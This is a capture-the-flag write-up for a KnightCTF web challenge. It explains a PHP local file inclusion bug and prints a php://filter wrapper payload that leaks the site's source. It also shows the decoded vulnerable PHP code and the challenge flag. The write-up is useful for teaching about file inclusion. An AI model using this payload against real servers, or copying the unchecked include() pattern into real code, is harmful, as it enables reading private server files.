# My PHP Site - knightctf

- Category: Web
- Points: 50
- Solves: 242
- Solved by: raff01

## Description

Try to find the flag from the website.

N:B: I'm a n00b developer.

Website Link: http://137.184.133.81:15002/?file=index.html

## Solution

The challenge consists of a web application that allows the user to include local files.
Probably there's a file that contains the flag.
The PHP function used to do this is `include()` so we can use `PHP Wrappers` to exploit it.
Let's try to find out the content of `index.php`:

```
php://filter/convert.base64-encode/resource=index.php
```

this line permits to retrieve the content of index.php and display it in base64 format. The result will be:

```
PD9waHAKCmlmKGlzc2V0KCRfR0VUWydmaWxlJ10pKXsKICAgIGlmICgkX0dFVFsnZmlsZSddID09ICJpbmRleC5waHAiKSB7CiAgICAgICAgZWNobyAiPGgxPkVSUk9SISE8L2gxPiI7CiAgICAgICAgZGllKCk7CiAgICB9ZWxzZXsKICAgICAgICBpbmNsdWRlICRfR0VUWydmaWxlJ107CiAgICB9Cgp9ZWxzZXsKICAgIGVjaG8gIjxoMT5Zb3UgYXJlIG1pc3NpbmcgdGhlIGZpbGUgcGFyYW1ldGVyPC9oMT4iOwoKICAgICNub3RlIDotIHNlY3JldCBsb2NhdGlvbiAvaG9tZS90YXJlcS9zM2NyRXRfZmw0OS50eHQKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5UYXJlcSdzIEhvbWUgUGFnZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjwvYm9keT4KPC9odG1sPgo=
```

that corresponds to:

```php
<?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}

?>
```

well, now we know the secret file name! Let's include it and get the flag:


![alt text](./pictures/1.PNG)

## Flag
`KCTF{L0C4L_F1L3_1ncLu710n}`
